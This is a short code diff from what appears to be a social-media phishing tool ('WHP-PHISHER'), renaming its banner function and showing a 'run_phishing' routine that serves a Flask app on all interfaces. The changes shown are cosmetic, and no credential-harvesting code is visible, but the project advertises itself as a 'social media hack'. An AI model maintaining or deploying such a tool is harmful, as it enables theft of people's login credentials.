@@ -34,8 +34,8 @@ def whp_team_banner():
     input(f"{Y}Press Enter after subscribing to continue...{N}")
     clear()
 
-def whp_phisher_banner():
-    show_banner("WHP-PHISHER", B)
+def whp_phish_banner():
+    show_banner("WHP-PHISH", B)
     print(f"{C}────────────────────────────────────────────────────────────")
     print(f"{G} FAST & POWERFUL SOCIAL MEDIA HACK")
     print(f"{Y} Developed by: White Hat Pro Team | High Performance")
@@ -195,8 +195,8 @@ def run_phishing(platform_data, port, platform_name):
     app.run(host="0.0.0.0", port=port)
 
 def main():
-    whp_phisher_banner()
-    whp_phisher_banner()
+    whp_phish_banner()
+    whp_phish_banner()
 
     print(f"{Y}Select a platform:{N}")
     keys = list(platforms.keys())
